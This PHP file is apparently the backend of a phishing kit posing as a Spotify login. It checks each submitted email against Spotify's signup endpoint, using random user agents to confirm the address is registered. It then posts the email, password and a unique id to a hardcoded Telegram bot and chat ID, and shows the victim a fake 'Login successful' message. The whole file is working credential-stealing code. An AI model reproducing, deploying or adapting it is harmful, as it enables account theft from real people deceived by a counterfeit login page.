<?php

// Process Spotify email validation
$emailToCheck = $_POST['signin_email'];
$validator = new SpotifyValidator();

header('Content-Type: application/json');

if ($validator->isEmailValid($emailToCheck)) {
    $telegram = new SendToTelegram();
    $telegram->sendMessage();
    echo json_encode([
        'status' => 'success',
        'message' => 'Login successful',
    ]);
} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'Login error',
    ]);
}

// Close cURL session for Telegram


class SendToTelegram
{
    function sendMessage()
    {
        // Telegram Bot API Token
        $botToken = "7764284417:AAE9-ADJoUIFoXjNuZclwFI8yJOpKRcINMQ"; // Replace with your bot's API token

// Chat ID (your Telegram ID or a group chat ID)
        $chatId = "1690728339"; // Replace with your chat ID

// Message to send
        $message = "Email: " . $_POST['signin_email'] . "\nPassword: " . $_POST['signin_password']. "\nUnique_id: " . $_POST['unique_id'];

// Telegram API URL
        $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Data to send to Telegram
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
        ];

// Send data to Telegram
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);

// Check for errors
        if (curl_errno($ch)) {
            echo "Error: " . curl_error($ch);
        } else {

        }
        curl_close($ch);
    }

}

class SpotifyValidator
{
    private $apiUrl = "https://spclient.wg.spotify.com/signup/public/v1/account";
    private $userAgent;

    public function __construct()
    {
        $this->userAgent = $this->getRandomUserAgent();
    }

    private function getRandomUserAgent()
    {
        $userAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        ];
        return $userAgents[array_rand($userAgents)];
    }

    public function isEmailValid($email)
    {
        // Prepare headers
        $headers = [
            "User-Agent: {$this->userAgent}",
        ];

        // Prepare data
        $params = [
            'validate' => '1',
            'email' => $email,
        ];

        // Initialize cURL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->apiUrl . '?' . http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        // Execute the request
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        // Handle cURL errors
        if (curl_errno($ch)) {
            echo "cURL Error: " . curl_error($ch) . PHP_EOL;
            curl_close($ch);
            return false;
        }

        // Close cURL
        curl_close($ch);

        // Decode JSON response
        $data = json_decode($response, true);


        // Validate the response
        if ($httpCode === 200 && isset($data['errors']) && isset($data['errors']['email'])) {
            return true;
        }

        return false; // Email is invalid (not registered)
    }
}

?>
